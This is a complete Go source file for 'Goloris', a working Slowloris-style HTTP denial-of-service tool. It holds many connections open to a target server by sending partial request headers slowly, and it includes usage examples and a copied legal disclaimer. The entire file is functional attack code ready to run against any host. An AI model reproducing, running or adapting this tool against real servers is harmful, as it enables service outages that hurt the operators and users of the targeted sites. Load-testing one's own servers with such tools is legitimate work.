package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"io/ioutil"
	"net"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"time"
)

const (
	defaultUserAgent = "Goloris HTTP DoS"
	defaultDOSHeader = "Cookie: a=b"
	legalDisclaimer  = `Usage of this program for attacking targets without prior mutual consent is
illegal. It is the end user's responsibility to obey all applicable local, 
state and federal laws. Developers assume no liability and are not 
responsible for any misuse or damage caused by this program.

This disclaimer was shamelessy copied from sqlmap with minor modifications :)
    `
)

func main() {
	var (
		numConnections int
		interval       int
		timeout        int
		method         string
		resource       string
		userAgent      string
		target         string
		https          bool
		dosHeader      string
		timermode      bool
		finishAfter    int
	)

	flag.Usage = usage
	flag.IntVar(&numConnections, "connections", 10, "Number of active concurrent connections")
	flag.IntVar(&interval, "interval", 1, "Number of seconds to wait between sending headers")
	flag.IntVar(&timeout, "timeout", 60, "HTTP connection timeout in seconds")
	flag.StringVar(&method, "method", "GET", "HTTP method to use")
	flag.StringVar(&resource, "resource", "/", "Resource to request from the server")
	flag.StringVar(&userAgent, "useragent", defaultUserAgent, "User-Agent header of the request")
	flag.StringVar(&dosHeader, "dosHeader", defaultDOSHeader, "Header to send repeatedly")
	flag.BoolVar(&https, "https", false, "Use HTTPS")
	flag.BoolVar(&timermode, "timermode", false, "Measure the timeout of the server. connections flag is omitted")
	flag.IntVar(&finishAfter, "finishafter", 0, "Seconds to wait before finishing the request. If zero the request is never finished")
	flag.Parse()

	if len(flag.Args()) == 0 {
		usage()
		os.Exit(-1)
	}

	signals := make(chan os.Signal, 1)
	signal.Notify(signals, os.Interrupt, os.Kill)

	target = flag.Args()[0]
	if !strings.Contains(target, ":") {
		if https {
			target += ":443"
		} else {
			target += ":80"
		}
	}

	if timermode {
		go timer(target, method, resource, timeout, https)
	} else {
		for i := 0; i < numConnections; i++ {
			go slowloris(target, dosHeader, method, resource, interval, timeout, finishAfter, https)
		}
	}

loop:
	for {
		select {
		case <-signals:
			fmt.Printf("Received SIGKILL, exiting...\n")
			break loop
		}
	}
}

func usage() {
	fmt.Println("")
	fmt.Println("usage: goloris [OPTIONS]... TARGET")
	fmt.Println("  TARGET host:port. port 80 is assumed for HTTP connections. 443 is assumed for HTTPS connections")
	fmt.Println("")
	fmt.Println("OPTIONS")
	flag.PrintDefaults()
	fmt.Println("")
	fmt.Println("EXAMPLES")
	fmt.Printf("  %s -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Printf("  %s -useragent=\"some user-agent string\" -https -connections=500 192.168.0.1\n", os.Args[0])
	fmt.Println("")
	fmt.Println(legalDisclaimer)
}

func timer(target, method, resource string, timeout int, https bool) {
	fmt.Printf("Timer mode activated. Use Ctrl+C to terminate the program.\n")
	for {
		d := getTimeout(target, method, resource, timeout, https)
		fmt.Printf("Server closed the connection after %.2f seconds\n", d.Seconds())
	}
}

func getTimeout(target, method, resource string, timeout int, https bool) time.Duration {
	start := time.Now()

	conn, err := openConnection(target, timeout, https)
	if err != nil {
		fmt.Println("FATAL: " + err.Error())
		os.Exit(-1)
	}

	trash := make([]byte, 1024)
	_, err = conn.Read(trash)
	if err != nil {
		return time.Now().Sub(start)
	}

	panic("This should not happen!")
}

func slowloris(target, dosHeader, method, resource string, interval, timeout, finishAfter int, https bool) {
	var conn net.Conn
	var err error

	var timerChan <-chan time.Time
	var timer *time.Timer
	if finishAfter > 0 {
		timer = time.NewTimer(time.Duration(finishAfter) * time.Second)
		timerChan = timer.C
	}

loop:
	for {
		if conn != nil {
			conn.Close()
		}

		conn, err = openConnection(target, timeout, https)
		if err != nil {
			continue
		}

		if _, err = fmt.Fprintf(conn, "%s %s HTTP/1.1\r\n", method, resource); err != nil {
			continue
		}

		header := createHeader(target)
		if err = header.Write(conn); err != nil {
			continue
		}

		for {
			select {
			case <-time.After(time.Duration(interval) * time.Second):
				if timer != nil {
					timer.Reset(time.Duration(finishAfter) * time.Second)
				}
				if _, err := fmt.Fprintf(conn, "%s\r\n", dosHeader); err != nil {
					continue loop
				}

			// if timerChan is nil (finishAfter =< 0) the case involving it will be omitted
			case <-timerChan:
				fmt.Fprintf(conn, "\r\n")
				ioutil.ReadAll(conn) // omit return values
				conn.Close()
				continue loop
			}
		}
	}

}

func openConnection(host string, timeout int, https bool) (net.Conn, error) {
	var conn net.Conn
	var err error
	timeoutDuration := time.Duration(timeout) * time.Second

	if https {
		config := &tls.Config{InsecureSkipVerify: true}
		conn, err = tls.Dial("tcp", host, config)
		if err != nil {
			return nil, err
		}
	} else {
		conn, err = net.DialTimeout("tcp", host, timeoutDuration)
		if err != nil {
			return nil, err
		}
	}

	return conn, nil
}

func createHeader(host string) *http.Header {
	hdr := http.Header{}

	headers := makeHeaderSlice(host)
	for header, value := range headers {
		hdr.Add(header, value)
	}

	return &hdr
}

func makeHeaderSlice(host string) map[string]string {
	headers := make(map[string]string)

	headers["Host"] = host
	headers["User-Agent"] = defaultUserAgent

	return headers
}
